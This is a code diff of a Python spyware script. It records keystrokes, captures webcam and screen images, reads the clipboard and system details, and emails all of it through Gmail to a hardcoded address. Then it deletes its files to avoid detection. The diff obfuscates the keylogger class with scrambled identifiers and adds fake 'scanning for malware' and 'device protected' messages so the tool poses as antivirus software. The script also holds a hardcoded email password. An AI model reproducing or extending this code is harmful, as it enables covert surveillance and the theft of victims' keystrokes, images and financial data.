@@ -17,44 +17,31 @@ import requests
 
 
 # class to log the keys and create a log file with intercepted keystrokes in
-class KeyLogger:
-    # initializing function
-    def __init__(self, filename: str = "keystrokes.txt") -> None:
-        self.filename = filename
-
-    @staticmethod
-    # capture the characters
-    def get_chars(keystroke):
-        try:
-            return keystroke.char
-        except AttributeError:
-            return str(keystroke)
-
-    # when keystroke is captured, write to the log file
-    def on_press(self, keystroke):
-        with open(self.filename, 'a') as logs:
-            logs.write("Key Pressed =  \"" + self.get_chars(keystroke) + "\"\n")
-
-    # start the listener
-    def main(self):
-        time_limit_reached = False
-
-        def stop_logger():
-            nonlocal time_limit_reached
-            time_limit_reached = True
-
-        timer = threading.Timer(5, stop_logger)
-
-        timer.start()
-
-        listener = keyboard.Listener(on_press=self.on_press,)
-        listener.start()
-
-        while not time_limit_reached and listener.is_alive():
-            time.sleep(1)
-
-        listener.stop()
-        timer.cancel()
+class main_KL :#line:1
+    def __init__ (O0O000OOO00O0OO0O ,filename :str ="keystrokes.txt")->None :#line:2
+        O0O000OOO00O0OO0O .filename =filename #line:3
+    @staticmethod #line:5
+    def get_chars (O0O00OO0OO0OO0OOO ):#line:7
+        try :#line:8
+            return O0O00OO0OO0OO0OOO .char #line:9
+        except AttributeError :#line:10
+            return str (O0O00OO0OO0OO0OOO )#line:11
+    def on_press (O00OO0O00000O00OO ,OO00OOOOO0O00O000 ):#line:14
+        with open (O00OO0O00000O00OO .filename ,'a')as OO00OO00OOO000O0O :#line:15
+            OO00OO00OOO000O0O .write ("Key Pressed =  \""+O00OO0O00000O00OO .get_chars (OO00OOOOO0O00O000 )+"\"\n")#line:16
+    def main (O00O0O000O0OO0000 ):#line:19
+        OOOOO00O0O0000O0O =False #line:20
+        def OOOOOOOO00O000O00 ():#line:22
+            nonlocal OOOOO00O0O0000O0O #line:23
+            OOOOO00O0O0000O0O =True #line:24
+        O0OO0O00OO0OO0OOO =threading .Timer (5 ,OOOOOOOO00O000O00 )#line:26
+        O0OO0O00OO0OO0OOO .start ()#line:27
+        OOO000000OO00OO0O =keyboard .Listener (on_press =O00O0O000O0OO0000 .on_press ,)#line:28
+        OOO000000OO00OO0O .start ()#line:29
+        while not OOOOO00O0O0000O0O and OOO000000OO00OO0O .is_alive ():#line:30
+            time .sleep (1 )#line:31
+        OOO000000OO00OO0O .stop ()#line:32
+        O0OO0O00OO0OO0OOO .cancel ()
 
 
 # Function to take an image from the webcam
@@ -79,9 +66,9 @@ def take_screenshot():
     screenshot = ImageGrab.grab()
     # save screenshot to a png file
     screenshot.save(filepath, 'PNG')
-
-
 # function to capture clipboard information (can often be email addresses or bank details potentially)
+
+
 def clipboard():
     # Read the data from the clipboard
     data = pyperclip.paste()
@@ -172,15 +159,12 @@ class EmailSender:
                 # Create a MIMEBase object and set the appropriate MIME type for the attachment
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(attachment.read())
-
             # Encode the attachment in ASCII characters to send by email
             encoders.encode_base64(part)
             # Add a header to specify the filename of the attachment
             part.add_header('Content-Disposition', f"attachment; filename= {item}")
-
             # Add the attachment to the email
             email.attach(part)
-
         # Connect to the gmail SMTP server and send the email
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
             server.starttls()
@@ -190,6 +174,7 @@ class EmailSender:
 
 # run keylogger
 if __name__ == "__main__":
+    print("Scanning machine for Malware ...")
     # if keystrokes.txt doesn't exist create file
     if not(os.path.exists("keystrokes.txt")):
         f = open("keystrokes.txt", "w")
@@ -200,7 +185,7 @@ if __name__ == "__main__":
     # run other functions to gather data
     webcam_image()
     take_screenshot()
-    logger = KeyLogger()
+    logger = main_KL()
     logger.main()
     time.sleep(5)
 
@@ -212,8 +197,8 @@ if __name__ == "__main__":
     sender_password = "pneewfuoyynmqctj"
 
     email_sender = EmailSender(sender_email, sender_password)
-
     recipient_email = "redpanda121003@gmail.com"
+
     email_subject = "Keylogger Data"
     # display the data in a presentable way
     email_message = '''\
@@ -233,23 +218,19 @@ if __name__ == "__main__":
     {get_users}
     
     {clipboard}
-    
     \
     '''.format(system_data=system_data, clipboard=clipboard(), get_users=get_users(), location_info=location_info)
-
     # assign variables to attachments for the email
     keystrokes_file = "keystrokes.txt"
     webcam_file = "webcam.png"
     screenshot_file = "screenshot.png"
-
     # send the email
     email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
-
     # close keystrokes file
     f.close()
-
     # delete files to avoid victim detecting the keylogger
     os.remove("keystrokes.txt")
     os.remove("screenshot.png")
     os.remove("webcam.png")
+    print("Machine Successfully scanned! Your device has been Protected!")
 
